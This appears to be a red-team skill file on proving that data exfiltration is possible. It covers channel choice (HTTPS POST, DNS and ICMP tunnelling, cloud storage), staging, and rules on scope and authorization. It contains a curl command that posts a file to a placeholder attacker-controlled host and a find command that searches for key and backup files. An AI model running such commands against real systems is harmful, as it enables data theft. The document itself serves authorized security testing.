---
name: exfiltration-overview
description: Proving data-exfiltration capability from a compromised host without actually stealing real sensitive data — channel selection and scope discipline. Use when a finding's impact needs to be demonstrated as "attacker-controlled data leaves the network," typically on a red-team/impact-validation engagement. Do not use to justify pulling real production data off a target — see shared/governance-rules and the Do not section below.
phases: [exfiltration, post-exploitation]
tags: [exfil, dns-tunnel, opsec]
mitre: [T1041, T1048, T1567]
requires_tools: []
---

The point of an exfiltration finding is proving the *path* exists and would work against real
data — not actually taking real data off the network. Default to synthetic/canary data for the
proof; treat pulling genuine sensitive records as the exception that needs explicit engagement
authorization, not the default way to demonstrate impact.

## Proving the path (synthetic data)

```
curl -X POST --data-binary @canary_file.txt https://<attacker-controlled-host>/collect
```
A uniquely named canary file (`ENGAGEMENT_<id>_PROOF_OF_EXFIL.txt` with an obviously fake content
marker) leaving the network to attacker-controlled infrastructure is sufficient proof — the
finding is "outbound HTTPS to an arbitrary destination is unrestricted," demonstrated safely.

## Channel selection (what's realistic to test, and why)

- **HTTPS POST** — the default; blends into normal egress traffic, works through most proxies.
- **DNS tunneling** — proves exfil works even when HTTP(S) egress is blocked/proxied (DNS is
  almost always allowed outbound): base32/base64-encode the payload into subdomain labels,
  resolve them against an attacker-controlled authoritative nameserver that logs each query.
  Slow (DNS label length limits throughput hard) — a proof-of-concept, not a real transfer method.
- **ICMP tunneling** — proof that even ICMP-only egress isn't a real containment boundary; rarely
  the primary channel, useful specifically when HTTP/DNS are both actually blocked.
- Cloud-native channels worth checking: an overly permissive S3 bucket policy, or a service
  account with `storage.objects.create` on an external-facing bucket, is itself an exfil-adjacent
  finding — the platform's own storage becomes the exfil destination.

## Staging

On a real engagement, data typically gets **staged** (collected, compressed, sometimes encrypted)
before the exfil step — enumerating what an attacker *could* stage (which directories/databases/
shares hold what looks like real sensitive data) is itself valuable evidence, separate from
actually collecting it:
```
find / -iname "*.sql" -o -iname "*backup*" -o -iname "*.pem" 2>/dev/null   # what's staging-worthy
```

## Do not

- Actually exfiltrate real customer/employee PII, credentials, or production data as your proof —
  use synthetic/canary data; if the engagement genuinely requires proving impact against real
  data volume, that needs explicit written authorization naming exactly what may leave the
  network, not an inference from "exploitation was authorized."
- Send exfiltrated (even synthetic) data anywhere other than infrastructure the operator
  controls and the client is aware of.
- Report "data exfiltration possible" without having actually demonstrated the channel — an
  untested assumption that egress filtering is absent is not the same finding as proving it.
